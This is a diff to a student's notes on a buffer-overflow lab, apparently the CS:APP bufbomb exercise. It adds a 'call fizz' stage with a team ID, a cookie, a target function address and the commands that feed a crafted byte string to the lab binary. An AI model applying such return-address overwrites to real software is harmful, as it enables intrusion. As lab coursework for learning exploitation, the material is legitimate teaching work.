@@ -32,3 +32,15 @@ We should consider endian, the overflow hex should be
 08bfffff208e0408
 
 ./sendstring < smoke.txt > smoke-raw.txt
+
+## call fizz
+
+Team: SA21011038
+Cookie: 0x41a21e87
+
+fizz = 08048dc0
+
+ 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx
+
+./sendstring < fizz.txt > fizz-raw.txt
+./bufbomb -t SA21011038 < fizz-raw.txt 
